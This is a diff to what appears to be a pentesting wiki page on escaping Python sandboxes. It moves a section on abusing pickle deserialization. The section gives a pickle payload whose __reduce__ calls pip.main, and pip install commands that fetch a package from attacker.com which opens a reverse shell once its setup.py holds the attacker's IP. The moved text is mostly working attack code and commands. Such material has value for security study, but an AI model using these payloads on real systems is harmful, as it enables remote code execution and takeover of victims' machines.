@@ -49,6 +49,40 @@ system('ls')
 
 Python try to **load libraries from the current directory first**: `python3 -c 'import sys; print(sys.path)'`
 
+## Bypass pickle sandbox with default installed python packages
+
+### Default packages
+
+You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)  
+Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.  
+For example the following pickle, when loaded, is going to import the pip library to use it:
+
+```python
+#Note that here we are importing the pip library so the pickle is created correctly
+#however, the victimdoesn't even need to have the library installed to execute it
+#the library is going to be loaded automatically
+
+import pickle, os, base64, pip
+class P(object):
+    def __reduce__(self):
+        return (pip.main,(["list"],))
+
+print(base64.b64encode(pickle.dumps(P(), protocol=0)))
+```
+
+### Pip package
+
+If you have access to `pip` or to `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
+
+```bash
+pip install http://attacker.com/Rerverse.tar.gz
+pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
+```
+
+You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
+
+{% file src="../../.gitbook/assets/reverse.tar.gz" %}
+
 ## Executing python code
 
 This is really interesting if some characters are forbidden because you can use the **hex/octal/B64** representation to **bypass** the restriction:
@@ -294,19 +328,6 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
          44 LOAD_CONST          0 (0)
          47 RETURN_VALUE
 ```
-
-## Pip packet
-
-If you have access to `pip` or to `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
-
-```bash
-pip install http://attacker.com/Rerverse.tar.gz
-pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
-```
-
-You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
-
-{% file src="../../.gitbook/assets/reverse.tar.gz" %}
 
 ## References
 
